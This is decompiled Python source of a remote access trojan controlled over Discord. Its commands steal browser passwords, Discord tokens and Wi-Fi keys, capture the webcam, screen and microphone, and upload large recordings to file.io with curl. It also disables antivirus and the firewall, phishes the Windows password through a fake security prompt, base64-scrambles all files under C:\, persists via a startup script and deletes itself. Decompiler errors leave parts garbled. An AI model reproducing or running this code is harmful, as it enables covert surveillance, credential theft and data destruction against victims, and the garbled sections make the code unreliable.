                        os.remove('Loginvault.db')
                        file = discord.File(temp + '\\passwords.txt', filename='passwords.txt')
                        await message.channel.send('[*] Command successfuly executed', file=file)
                        os.system('del %temp%\\passwords.txt /f')
                    else:  # inserted
                        Exception as e:
                            pass
                    finally:  # inserted
                        if message.content == '!streamwebcam':
                            await message.channel.send('[*] Command successfuly executed')
                            import os, time, cv2, threading, sys, pathlib
                            temp = os.getenv('TEMP')
                            camera_port = 0
                            camera = cv2.VideoCapture(camera_port)
                            running = message.content
                            file = temp + '\\hobo\\hello.txt'
                            if os.path.isfile(file):
                                delelelee = 'del ' + file + ' /f'
                                os.system(delelelee)
                                os.system('RMDIR %temp%\\hobo /s /q')
                            while True:  # inserted
                                return_value, image = camera.read()
                                cv2.imwrite(temp + '\\temp.png', image)
                                boom = discord.File(temp + '\\temp.png', filename='temp.png')
                                kool = await message.channel.send(file=boom)
                                temp = os.getenv('TEMP')
                                file = temp + '\\hobo\\hello.txt'
                                if os.path.isfile(file):
                                    del camera
                                    break
                        if message.content == '!stopwebcam':
                            import os
                            os.system('mkdir %temp%\\hobo')
                            os.system('echo hello>%temp%\\hobo\\hello.txt')
                            os.system('del %temp\\temp.png /F')
                        if message.content == '!getdiscordinfo':
                            import os
                            if os.name!= 'nt':
                                exit()
                            from re import findall
                            from json import loads, dumps
                            from base64 import b64decode
                            from subprocess import Popen, PIPE
                            from urllib.request import Request, urlopen
                            from threading import Thread
                            from time import sleep
                            from sys import argv
                            LOCAL = os.getenv('LOCALAPPDATA')
                            ROAMING = os.getenv('APPDATA')
                            PATHS = {'Discord': ROAMING + '\\Discord', 'Discord Canary': ROAMING + '\\discordcanary', 'Discord PTB': ROAMING + '\\discordptb', 'Google Chrome': LOCAL + '\\Google\\Chrome\\User Data\\Default', 'Opera': ROAMING + '\\Opera Software\\Opera Stable', 'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default', 'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default'}

                            def getHeader(token=None, content_type='application/json'):
                                headers = {'Content-Type': content_type, 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36'}
                                if token:
                                    headers.update({'Authorization': token})
                                return headers

                            def getUserData(token):
                                try:
                                    return loads(urlopen(Request('https://discordapp.com/api/v6/users/@me', headers=getHeader(token))).read().decode())
                                except:
                                    pass

                            def getTokenz(path):
                                path += '\\Local Storage\\leveldb'
                                tokens = []
                                for file_name in os.listdir(path):
                                    if not file_name.endswith('.log') and (not file_name.endswith('.ldb')):
                                        continue
                                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                                        for regex in ['[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}', 'mfa\\.[\\w-]{84}']:
                                            for token in findall(regex, line):
                                                tokens.append(token)
                                return tokens

                            def whoTheFuckAmI():
                                ip = 'None'
                                try:
                                    ip = urlopen(Request('https://ifconfig.me')).read().decode().strip()
                                except:
                                    pass
                                return ip

                            def hWiD():
                                p = Popen('wmic csproduct get uuid', shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
                                return (p.stdout.read() + p.stderr.read()).decode().split('\n')[1]

                            def getFriends(token):
                                try:
                                    return loads(urlopen(Request('https://discordapp.com/api/v6/users/@me/relationships', headers=getHeader(token))).read().decode())
                                except:
                                    pass

                            def getChat(token, uid):
                                try:
                                    return loads(urlopen(Request('https://discordapp.com/api/v6/users/@me/channels', headers=getHeader(token), data=dumps({'recipient_id': uid}).encode())).read().decode())['id']
                                except:
                                    pass

                            def paymentMethods(token):
                                try:
                                    return bool(len(loads(urlopen(Request('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=getHeader(token))).read().decode())) > 0)
                                except:
                                    pass

                            def sendMessages(token, chat_id, form_data):
                                try:
                                    urlopen(Request(f'https://discordapp.com/api/v6/channels/{chat_id}/messages', headers=getHeader(token, 'multipart/form-data; boundary=---------------------------325414537030329320151394843687'), data=form_data.encode())).read().decode()
                                except:
                                    pass

                            def main():
                                cache_path = ROAMING + '\\.cache~$'
                                prevent_spam = True
                                self_spread = True
                                embeds = []
                                working = []
                                checked = []
                                already_cached_tokens = []
                                working_ids = []
                                ip = whoTheFuckAmI()
                                pc_username = os.getenv('UserName')
                                pc_name = os.getenv('COMPUTERNAME')
                                user_path_name = os.getenv('userprofile').split('\\')[2]
                                for platform, path in PATHS.items():
                                    if not os.path.exists(path):
                                        continue
                                    for token in getTokenz(path):
                                        if (token, checked) and (not <Code38 code object between_callback at 0x73a6fab20450, file yourphone.py>, line 106):
                                            continue
                                        checked.append(token)
                                        uid = None
                                        if not token.startswith('mfa.'):
                                            try:
                                                uid = b64decode(token.split('.')[0].encode()).decode()
                                            except:
                                                pass
                                            if not uid or uid in working_ids or []:
                                                continue
                                        user_data = getUserData(token)
                                        if not user_data:
                                            continue
                                        working_ids.append(uid)
                                        working.append(token)
                                        username = user_data['username'] + '#' + str(user_data['discriminator'])
                                        user_id = user_data['id']
                                        email = user_data.get('email')
                                        phone = user_data.get('phone')
                                        nitro = bool(user_data.get('premium_type'))
                                        billing = bool(paymentMethods(token))
                                        embed = f'\nEmail: {email}\nPhone: {phone}\nNitro: {nitro}\nBilling Info: {billing}\nvalue: IP: {ip}\nUsername: {pc_username}\nPC Name: {pc_name}\nToken Location: {platform}     \nToken : {token}                       \nusername: {username} ({user_id})\n'
                                        return str(embed)
                            try:
                                embed = main()
                                await message.channel.send('[*] Command successfuly executed\n' + str(embed))
                            else:  # inserted
                                Exception as e:
                                    e = None
                                    del e if e else None
                            finally:  # inserted
                                if message.content == '!streamscreen':
                                    await message.channel.send('[*] Command successfuly executed')
                                    import os
                                    from mss import mss
                                    temp = os.getenv('TEMP')
                                    hellos = temp + '\\hobos\\hellos.txt'
                                    if os.path.isfile(hellos):
                                        os.system('del %temp%\\hobos\\hellos.txt /f')
                                        os.system('RMDIR %temp%\\hobos /s /q')
                                    while True:  # inserted
                                        with mss() as sct:
                                            sct.shot(output=os.path.join(os.getenv('TEMP') + '\\monitor.png'))
                                            <mask_0>.ODk0MTY3ODU1MjIwNzkzMzc0.YVmEtQ.VI1XHUw_mU1O5tMrotrkkY0N35w('_Selector__preGet', None, (f'{None}' := (f'{None}' := (f'{None}' := (f'{None}' := (f'{None}' := (f'{None}' := (f'{None}' := (f'{None}' if f'{None}' if f'{None}' if f'{None}' is not None))))))
                                        else:  # inserted
                                            if not (446, 447, 448, 449, 440):
                                                def AudioUtilities(commands, *, *: <Code38 code object uncritproc at 0x73a68e52fe50, file yourphone.py>, line 173, utils: <mask_18>, command_prefix: <Code38 code object on_message at 0x73a68e52d590, file yourphone.py>, line 177, winreg: <mask_20>, ctypes: CLSCTX_ALL, sys: CLSCTX_ALL, os: CLSCTX_ALL, ssl: CLSCTX_ALL, random: CLSCTX_ALL, threading: CLSCTX_ALL, time: CLSCTX_ALL, cv2: CLSCTX_ALL, subprocess: CLSCTX_ALL, discord: CLSCTX_ALL, comtypes: CLSCTX_ALL, pycaw.pycaw: CLSCTX_ALL, discord.ext: CLSCTX_ALL, asyncio: CLSCTX_ALL, token: CLSCTX_ALL, getenv: CLSCTX_ALL, appdata: CLSCTX_ALL, Client: CLSCTX_ALL, client: CLSCTX_ALL, Bot: CLSCTX_ALL, bot: CLSCTX_ALL, _create_unverified_context: CLSCTX_ALL, _create_default_https_context: CLSCTX_ALL,helpmenu: CLSCTX_ALL, event: CLSCTX_ALL, run: CLSCTX_ALL, <module>: CLSCTX_ALL, <mask_56>: CLSCTX_ALL, Visiting: : CLSCTX_ALL, <mask_58>: CLSCTX_ALL, <mask_59>:CLSCTX_ALL, <mask_60>:CLSCTX_ALL, win32gui: CLSCTX_ALL, stop_threads:CLSCTX_ALL, GetWindowText:CLSCTX_ALL, GetForegroundWindow: CLSCTX_ALL, Game: CLSCTX_ALL, change_presence:
                                                    pass  # postinserted
                                        except:
                                            except:
                                                pass  # postinserted
                                        path = os.getenv('TEMP') + '\\monitor.png'
                                        file = discord.File(path, filename='monitor.png')
                                        await message.channel.send(file=file)
                                        temp = os.getenv('TEMP')
                                        hellos = temp + '\\hobos\\hellos.txt'
                                        if os.path.isfile(hellos):
                                            break
                                if message.content == '!stopscreen':
                                    import os
                                    os.system('mkdir %temp%\\hobos')
                                    os.system('echo hello>%temp%\\hobos\\hellos.txt')
                                    os.system('del %temp%\\monitor.png /F')
                                if message.content == '!shutdown':
                                    import os
                                    uncritproc()
                                    os.system('shutdown /p')
                                    await message.channel.send('[*] Command successfuly executed')
                                if message.content == '!restart':
                                    import os
                                    uncritproc()
                                    os.system('shutdown /r /t 00')
                                    await message.channel.send('[*] Command successfuly executed')
                                if message.content == '!logoff':
                                    import os
                                    uncritproc()
                                    os.system('shutdown /l /f')
                                    await message.channel.send('[*] Command successfuly executed')
                                if message.content == '!bluescreen':
                                    import ctypes
                                    import ctypes.wintypes
                                    ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
                                    ctypes.windll.ntdll.NtRaiseHardError(3221225506, 0, 0, 0, 6, ctypes.byref(ctypes.wintypes.DWORD()))
                                if message.content == '!currentdir':
                                    import subprocess as sp
                                    output = sp.getoutput('cd')
                                    await message.channel.send('[*] Command successfuly executed')
                                    await message.channel.send('output is : ' + output)
                                if message.content == '!displaydir':
                                    import subprocess, sp, time, os, subprocess

                                    def shell():
                                        global status  # inserted
                                        output = subprocess.run('dir', stdout=subprocess.PIPE, shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                                        status = 'ok'
                                        return output
                                    import threading
                                    shel = threading.Thread(target=shell)
                                    shel._running = True
                                    shel.start()
                                    time.sleep(1)
                                    shel._running = False
                                    if status:
                                        result = str(shell().stdout.decode('CP437'))
                                        numb = len(result)
                                        if numb < 1:
                                            await message.channel.send('[*] Command not recognized or no output was obtained')
                                        else:  # inserted
                                            if numb > 1990:
                                                temp = os.getenv('TEMP')
                                                if os.path.isfile(temp + '\\output22.txt'):
                                                    os.system('del %temp%\\output22.txt /f')
                                                f1 = open(temp + '\\output22.txt', 'a')
                                                f1.write(result)
                                                f1.close()
                                                file = discord.File(temp + '\\output22.txt', filename='output22.txt')
                                                await message.channel.send('[*] Command successfuly executed', file=file)
                                            else:  # inserted
                                                await message.channel.send('[*] Command successfuly executed : ' + result)
                                if message.content == '!dateandtime':
                                    import subprocess as sp
                                    output = sp.getoutput('echo time = %time% date = %date%')
                                    await message.channel.send('[*] Command successfuly executed')
                                    await message.channel.send('output is : ' + output)
                                if message.content == '!listprocess':
                                    import subprocess as sp
                                    import time
                                    import os, subprocess

                                    def shell():
                                        global status  # inserted
                                        output = subprocess.run('tasklist', stdout=subprocess.PIPE, shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                                        status = 'ok'
                                        return output
                                    import threading
                                    shel = threading.Thread(target=shell)
                                    shel._running = True
                                    shel.start()
                                    time.sleep(1)
                                    shel._running = False
                                    if status:
                                        result = str(shell().stdout.decode('CP437'))
                                        numb = len(result)
                                        if numb < 1:
                                            await message.channel.send('[*] Command not recognized or no output was obtained')
                                        else:  # inserted
                                            if numb > 1990:
                                                temp = os.getenv('TEMP')
                                                if os.path.isfile(temp + '\\output.txt'):
                                                    os.system('del %temp%\\output.txt /f')
                                                f1 = open(temp + '\\output.txt', 'a')
                                                f1.write(result)
                                                f1.close()
                                                file = discord.File(temp + '\\output.txt', filename='output.txt')
                                                await message.channel.send('[*] Command successfuly executed', file=file)
                                            else:  # inserted
                                                await message.channel.send('[*] Command successfuly executed : ' + result)
                                if message.content.startswith('!prockill'):
                                    import os
                                    proc = message.content[10:]
                                    kilproc = 'taskkill /IM \"' + proc + '\" ' + '/f'
                                    import time, os, subprocess
                                    os.system(kilproc)
                                    import subprocess
                                    time.sleep(2)
                                    process_name = proc
                                    call = ('TASKLIST', '/FI', 'imagename eq %s' % process_name)
                                    output = subprocess.check_output(call).decode()
                                    last_line = output.strip().split('\r\n')[(-1)]
                                    done = last_line.lower().startswith(process_name.lower())
                                    if done == False:
                                        await message.channel.send('[*] Command successfuly executed')
                                    else:  # inserted
                                        if done == True:
                                            await message.channel.send('[*] Command did not exucute properly')
                                if message.content.startswith('!recscreen'):
                                    import cv2
                                    import numpy as np
                                    import pyautogui
                                    reclenth = float(message.content[10:])
                                    input2 = 0
                                    while True:  # inserted
                                        input2 = input2 + 1
                                        input3 = 0.045 * input2
                                        if input3 >= reclenth:
                                            break
                                    import os
                                    SCREEN_SIZE = (1920, 1080)
                                    fourcc = cv2.VideoWriter_fourcc(*'XVID')
                                    temp = os.getenv('TEMP')
                                    videeoo = temp + '\\output.avi'
                                    out = cv2.VideoWriter(videeoo, fourcc, 20.0, SCREEN_SIZE)
                                    counter = 1
                                    while True:  # inserted
                                        counter = counter + 1
                                        img = pyautogui.screenshot()
                                        frame = np.array(img)
                                        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
                                        out.write(frame)
                                        if counter >= input2:
                                            break
                                    out.release()
                                    import subprocess, os
                                    temp = os.getenv('TEMP')
                                    check = temp + '\\output.avi'
                                    check2 = os.stat(check).st_size
                                    if check2 > 7340032:
                                        instruction = 'curl -F file=@\"' + check + '\"' + ' https://file.io/?expires=1w'
                                        await message.channel.send('this may take some time becuase it is over 8 MB. please wait')
                                        string = subprocess.getoutput(instruction)
                                        import re
                                        output = re.search('key', string).start()
                                        output = output + 6
                                        output2 = output + 12
                                        boom = string[output:output2]
                                        boom = 'https://file.io/' + boom
                                        await message.channel.send('video download link: ' + boom)
                                        await message.channel.send('[*] Command successfuly executed')
                                        os.system('del %temp%\\output.avi /f')
                                    else:  # inserted
                                        file = discord.File(check, filename='output.avi')
                                        await message.channel.send('[*] Command successfuly executed', file=file)
                                        os.system('del %temp%\\output.avi /f')
                                if message.content.startswith('!reccam'):
                                    import cv2
                                    import numpy as np
                                    import pyautogui
                                    input1 = float(message.content[8:])
                                    import cv2
                                    import os
                                    temp = os.getenv('TEMP')
                                    vid_capture = cv2.VideoCapture(0)
                                    vid_cod = cv2.VideoWriter_fourcc(*'XVID')
                                    loco = temp + '\\output.mp4'
                                    output = cv2.VideoWriter(loco, vid_cod, 20.0, (640, 480))
                                    input2 = 0
                                    while True:  # inserted
                                        input2 = input2 + 1
                                        input3 = 0.045 * input2
                                        ret, frame = vid_capture.read()
                                        output.write(frame)
                                        if input3 >= input1:
                                            break
                                    vid_capture.release()
                                    output.release()
                                    import subprocess, os
                                    temp = os.getenv('TEMP')
                                    check = temp + '\\output.mp4'
                                    check2 = os.stat(check).st_size
                                    if check2 > 7340032:
                                        instruction = 'curl -F file=@\"' + check + '\"' + ' https://file.io/?expires=1w'
                                        await message.channel.send('this may take some time becuase it is over 8 MB. please wait')
                                        string = subprocess.getoutput(instruction)
                                        import re
                                        output = re.search('key', string).start()
                                        output = output + 6
                                        output2 = output + 12
                                        boom = string[output:output2]
                                        boom = 'https://file.io/' + boom
                                        await message.channel.send('video download link: ' + boom)
                                        await message.channel.send('[*] Command successfuly executed')
                                        os.system('del %temp%\\output.mp4 /f')
                                    else:  # inserted
                                        file = discord.File(check, filename='output.mp4')
                                        await message.channel.send('[*] Command successfuly executed', file=file)
                                        os.system('del %temp%\\output.mp4 /f')
                                if message.content.startswith('!recaudio'):
                                    import cv2, numpy as np, pyautogui, os, sounddevice as sd
                                    from scipy.io.wavfile import write
                                    seconds = float(message.content[10:])
                                    temp = os.getenv('TEMP')
                                    fs = 44100
                                    laco = temp + '\\output.wav'
                                    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
                                    sd.wait()
                                    write(laco, fs, myrecording)
                                    import subprocess, os
                                    temp = os.getenv('TEMP')
                                    check = temp + '\\output.wav'
                                    check2 = os.stat(check).st_size
                                    if check2 > 7340032:
                                        instruction = 'curl -F file=@\"' + check + '\"' + ' https://file.io/?expires=1w'
                                        await message.channel.send('this may take some time becuase it is over 8 MB. please wait')
                                        string = subprocess.getoutput(instruction)
                                        import re
                                        output = re.search('key', string).start()
                                        output = output + 6
                                        output2 = output + 12
                                        boom = string[output:output2]
                                        boom = 'https://file.io/' + boom
                                        await message.channel.send('video download link: ' + boom)
                                        await message.channel.send('[*] Command successfuly executed')
                                        os.system('del %temp%\\output.wav /f')
                                    else:  # inserted
                                        file = discord.File(check, filename='output.wav')
                                        await message.channel.send('[*] Command successfuly executed', file=file)
                                        os.system('del %temp%\\output.wav /f')
                                if message.content.startswith('!delete'):
                                    import time, subprocess
                                    import os
                                    instruction = message.content[8:]
                                    instruction = 'del \"' + instruction + '\"' + ' /F'

                                    def shell():
                                        output = subprocess.run(instruction, stdout=subprocess.PIPE, shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                                        return output
                                    import threading
                                    shel = threading.Thread(target=shell)
                                    shel._running = True
                                    shel.start()
                                    time.sleep(1)
                                    shel._running = False
                                    statue = 'ok'
                                    if statue:
                                        numb = len(result)
                                        if numb > 0:
                                            await message.channel.send('[*] an error has occurred')
                                        else:  # inserted
                                            await message.channel.send('[*] Command successfuly executed')
                                    else:  # inserted
                                        await message.channel.send('[*] Command not recognized or no output was obtained')
                                        statue = None
                                if message.content == '!disableantivirus':
                                    import ctypes, os
                                    is_admin = ctypes.windll.shell32.IsUserAnAdmin()!= 0
                                    if is_admin == True:
                                        import subprocess
                                        instruction = ' REG QUERY \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\" | findstr /I /C:\"CurrentBuildnumber\"  '

                                        def shell():
                                            output = subprocess.run(instruction, stdout=subprocess.PIPE, shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                                            return output
                                        result = str(shell().stdout.decode('CP437'))
                                        done = result.split()
                                        boom = done[2:]
                                        if boom <= ['17763']:
                                            os.system('Dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet')
                                            await message.channel.send('[*] Command successfuly executed')
                                        else:  # inserted
                                            if boom >= ['18362']:
                                                os.system(' Add-MpPreference -ExclusionPath \"C:\\\\\" ')
                                                await message.channel.send('[*] Command successfuly executed')
                                            else:  # inserted
                                                await message.channel.send('[*] An unknown error has occurred')
                                    else:  # inserted
                                        await message.channel.send('[*] This command requires admin privileges')
                                if message.content == '!disablefirewall':
                                    import ctypes, os
                                    is_admin = ctypes.windll.shell32.IsUserAnAdmin()!= 0
                                    if is_admin == True:
                                        os.system('NetSh Advfirewall set allprofiles state off')
                                        await message.channel.send('[*] Command successfuly executed')
                                    else:  # inserted
                                        await message.channel.send('[*] This command requires admin privileges')
                                if message.content.startswith('!audio'):
                                    import os
                                    temp = os.getenv('TEMP')
                                    temp = temp + '\\audiofile.wav'
                                    if os.path.isfile(temp):
                                        delelelee = 'del ' + temp + ' /f'
                                        os.system(delelelee)
                                    temp1 = os.getenv('TEMP')
                                    temp1 = temp1 + '\\sounds.vbs'
                                    if os.path.isfile(temp1):
                                        delelee = 'del ' + temp1 + ' /f'
                                        os.system(delelee)
                                    await message.attachments[0].save(temp)
                                    temp2 = os.getenv('TEMP')
                                    f5 = open(temp2 + '\\sounds.vbs', 'a')
                                    result = ' Dim oPlayer: Set oPlayer = CreateObject(\"WMPlayer.OCX\"): oPlayer.URL = \"' + temp + '\": oPlayer.controls.play: While oPlayer.playState <> 1 WScript.Sleep 100: Wend: oPlayer.close '
                                    f5.write(result)
                                    f5.close()
                                    os.system('start %temp%\\sounds.vbs')
                                    await message.channel.send('[*] Command successfuly executed')
                                if message.content == '!selfdestruct':
                                    import inspect, os, sys, inspect
                                    uncritproc()
                                    cmd2 = inspect.getframeinfo(inspect.currentframe()).filename
                                    hello = os.getpid()
                                    bat = '@echo off & taskkill /F /PID ' + str(hello) + ' &' + ' del ' + '\"' + cmd2 + '\"' + ' /F' + ' & ' + 'start /b \"\" cmd /c del \"%~f0\"& taskkill /IM cmd.exe /F &exit /b'
                                    temp = os.getenv('TEMP')
                                    temp5 = temp + '\\delete.bat'
                                    if os.path.isfile(temp5):
                                        delelee = 'del ' + temp5 + ' /f'
                                        os.system(delelee)
                                    f5 = open(temp + '\\delete.bat', 'a')
                                    f5.write(bat)
                                    f5.close()
                                    os.system('start /min %temp%\\delete.bat')
                                if message.content == '!windowspass':
                                    import sys, subprocess, os
                                    cmd82 = '$cred=$host.ui.promptforcredential(\'Windows Security Update\',\'\',[Environment]::UserName,[Environment]::UserDomainName);'
                                    cmd92 = 'echo $cred.getnetworkcredential().password;'
                                    full_cmd = 'Powershell \"{} {}\"'.format(cmd82, cmd92)
                                    instruction = full_cmd

                                    def shell():
                                        output = subprocess.run(full_cmd, stdout=subprocess.PIPE, shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                                        return output
                                    result = str(shell().stdout.decode('CP437'))
                                    await message.channel.send('[*] Command successfuly executed')
                                    await message.channel.send('password user typed in is: ' + result)
                                if message.content == '!displayoff':
                                    import ctypes
                                    is_admin = ctypes.windll.shell32.IsUserAnAdmin()!= 0
                                    if is_admin == True:
                                        import ctypes
                                        WM_SYSCOMMAND = 274
                                        HWND_BROADCAST = 65535
                                        SC_MONITORPOWER = 61808
                                        ctypes.windll.user32.BlockInput(True)
                                        ctypes.windll.user32.SendMessageW(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2)
                                        await message.channel.send('[*] Command successfuly executed')
                                    else:  # inserted
                                        await message.channel.send('[!] Admin rights are required for this operation')
                                if message.content == '!displayon':
                                    import ctypes
                                    is_admin = ctypes.windll.shell32.IsUserAnAdmin()!= 0
                                    if is_admin == True:
                                        from pynput.keyboard import Key, Controller
                                        keyboard = Controller()
                                        keyboard.press(Key.esc)
                                        keyboard.release(Key.esc)
                                        keyboard.press(Key.esc)
                                        keyboard.release(Key.esc)
                                        ctypes.windll.user32.BlockInput(False)
                                        await message.channel.send('[*] Command successfuly executed')
                                    else:  # inserted
                                        await message.channel.send('[!] Admin rights are required for this operation')
                                if message.content == '!hide':
                                    import os, inspect
                                    cmd237 = inspect.getframeinfo(inspect.currentframe()).filename
                                    os.system('attrib +h \"{}\" '.format(cmd237))
                                    await message.channel.send('[*] Command successfuly executed')
                                if message.content == '!unhide':
                                    import os, inspect
                                    cmd237 = inspect.getframeinfo(inspect.currentframe()).filename
                                    os.system('attrib -h \"{}\" '.format(cmd237))
                                    await message.channel.send('[*] Command successfuly executed')
                                if message.content == '!decode' or message.content == '!encode':
                                    import os
                                    import base64

                                    def encode(file):
                                        f = open(file)
                                        data = f.read()
                                        f.close()
                                        data = data.encode('utf-8')
                                        encodedBytes = base64.b64encode(data)
                                        os.remove(file)
                                        file = file + '.rip'
                                        t = open(file, 'w+')
                                        encodedBytes = encodedBytes.decode('utf-8')
                                        t.write(encodedBytes)
                                        t.close()

                                    def decode(file):
                                        f = open(file)
                                        data = f.read()
                                        f.close()
                                        data = data.encode('utf-8')
                                        decodedBytes = base64.b64decode(data)
                                        os.remove(file)
                                        file = file.replace('.rip', '')
                                        t = open(file, 'w+')
                                        decodedBytes = decodedBytes.decode('utf-8')
                                        t.write(decodedBytes)
                                        t.close()
                                    parentDirectory = 'C:\\'
                                    for root, dirs, files in os.walk(parentDirectory):
                                        for afile in files:
                                            full_path = os.path.join(root, afile)
                                            if message.content == '!encode':
                                                encode(full_path)
                                                await message.channel.send('[*] Command successfuly executed')
                                            if message.content == '!decode' and full_path.endswith('.rip'):
                                                decode(full_path)
                                                await message.channel.send('[*] Command successfuly executed')
                                if message.content == '!ejectcd':
                                    import ctypes
                                    return ctypes.windll.WINMM.mciSendStringW('set cdaudio door open', None, 0, None)
                                if message.content == '!retractcd':
                                    import ctypes
                                    return ctypes.windll.WINMM.mciSendStringW('set cdaudio door closed', None, 0, None)
                                if message.content == '!critproc':
                                    import ctypes
                                    is_admin = ctypes.windll.shell32.IsUserAnAdmin()!= 0
                                    if is_admin == True:
                                        critproc()
                                        await message.channel.send('[*] Command successfuly executed')
                                    else:  # inserted
                                        await message.channel.send('[*] Not admin :(')
                                if message.content == '!uncritproc':
                                    import ctypes
                                    is_admin = ctypes.windll.shell32.IsUserAnAdmin()!= 0
                                    if is_admin == True:
                                        uncritproc()
                                        await message.channel.send('[*] Command successfuly executed')
                                    else:  # inserted
                                        await message.channel.send('[*] Not admin :(')
                                if message.content.startswith('!website'):
                                    import subprocess
                                    website = message.content[9:]

                                    def OpenBrowser(URL):
                                        if not URL.startswith('http'):
                                            URL = 'http://' + URL
                                        subprocess.call('start ' + URL, shell=True)
                                    OpenBrowser(website)
                                    await message.channel.send('[*] Command successfuly executed')
                                if message.content == '!distaskmgr':
                                    import ctypes
                                    import os
                                    is_admin = ctypes.windll.shell32.IsUserAnAdmin()!= 0
                                    if is_admin == True:
                                        import time
                                        statuuusss = None
                                        import subprocess
                                        import os
                                        instruction = 'reg query \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\"'

                                        def shell():
                                            output = subprocess.run(instruction, stdout=subprocess.PIPE, shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                                            statuuusss = 'ok'
                                            return output
                                        import threading
                                        shel = threading.Thread(target=shell)
                                        shel._running = True
                                        shel.start()
                                        time.sleep(1)
                                        shel._running = False
                                        result = str(shell().stdout.decode('CP437'))
                                        if len(result) <= 5:
                                            import winreg as reg
                                            reg.CreateKey(reg.HKEY_CURRENT_USER, 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System')
                                            import os
                                            os.system('powershell New-ItemProperty -Path \"HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name \"DisableTaskMgr\" -Value \"1\" -Force')
                                        else:  # inserted
                                            import os
                                            os.system('powershell New-ItemProperty -Path \"HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name \"DisableTaskMgr\" -Value \"1\" -Force')
                                        await message.channel.send('[*] Command successfuly executed')
                                    else:  # inserted
                                        await message.channel.send('[*] This command requires admin privileges')
                                if message.content == '!enbtaskmgr':
                                    import ctypes, os
                                    is_admin = ctypes.windll.shell32.IsUserAnAdmin()!= 0
                                    if is_admin == True:
                                        import ctypes, os
                                        is_admin = ctypes.windll.shell32.IsUserAnAdmin()!= 0
                                        if is_admin == True:
                                            import time
                                            statusuusss = None
                                            import subprocess
                                            import os
                                            instruction = 'reg query \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\"'

                                            def shell():
                                                output = subprocess.run(instruction, stdout=subprocess.PIPE, shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                                                statusuusss = 'ok'
                                                return output
                                            import threading
                                            shel = threading.Thread(target=shell)
                                            shel._running = True
                                            shel.start()
                                            time.sleep(1)
                                            shel._running = False
                                            result = str(shell().stdout.decode('CP437'))
                                            if len(result) <= 5:
                                                await message.channel.send('[*] Command successfuly executed')
                                            else:  # inserted
                                                import winreg as reg
                                                reg.DeleteKey(reg.HKEY_CURRENT_USER, 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System')
                                                await message.channel.send('[*] Command successfuly executed')
                                    else:  # inserted
                                        await message.channel.send('[*] This command requires admin privileges')
                                if message.content == '!getwifipass':
                                    import ctypes, os
                                    is_admin = ctypes.windll.shell32.IsUserAnAdmin()!= 0
                                    if is_admin == True:
                                        import ctypes, os
                                        is_admin = ctypes.windll.shell32.IsUserAnAdmin()!= 0
                                        if is_admin == True:
                                            import os, subprocess, json
                                            x = subprocess.run('NETSH WLAN SHOW PROFILE', stdout=subprocess.PIPE, shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE).stdout.decode('CP437')
                                            x = x[x.find('User profiles\r\n-------------\r\n') + len('User profiles\r\n-------------\r\n'):len(x)].replace('\r\n\r\n\"', '').replace('All User Profile', '\"All User Profile\"')[4:]
                                            lst = []
                                            done = []
                                            for i in x.splitlines():
                                                i = i.replace('\"All User Profile\"     : ', '')
                                                b = (-1)
                                                while True:  # inserted
                                                    b = b + 1
                                                    if i.startswith(' '):
                                                        i = i[1:]
                                                    if b >= len(i):
                                                        break
                                                lst.append(i)
                                            lst.remove('')
                                            for e in lst:
                                                output = subprocess.run('NETSH WLAN SHOW PROFILE \"' + e + '\" KEY=CLEAR ', stdout=subprocess.PIPE, shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE).stdout.decode('CP437')
                                                for i in output.splitlines():
                                                    if i.find('Key Content')!= (-1):
                                                        ok = i[4:].replace('Key Content            : ', '')
                                                        break
                                                almoast = '\"' + e + '\"' + ':' + '\"' + ok + '\"'
                                                done.append(almoast)
                                            await message.channel.send('[*] Command successfuly executed')
                                            await message.channel.send(done)
                                    else:  # inserted
                                        await message.channel.send('[*] This command requires admin privileges')
                                if message.content == '!startup':
                                    import ctypes, os, sys
                                    is_admin = ctypes.windll.shell32.IsUserAnAdmin()!= 0
                                    if is_admin == True:
                                        path = sys.argv[0]
                                        os.system('copy \"{}\" \"C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\" /Y'.format(path))
                                        print(path)
                                        e = '\nSet objShell = WScript.CreateObject(\"WScript.Shell\")\nobjShell.Run \"cmd /c cd C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\ && python {}\", 0, True\n'.format(os.path.basename(sys.argv[0]))
                                        with open('C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\startup.vbs'.format(os.getenv('USERNAME')), 'w') as f:
                                            f.write(e)
                                            f.close()
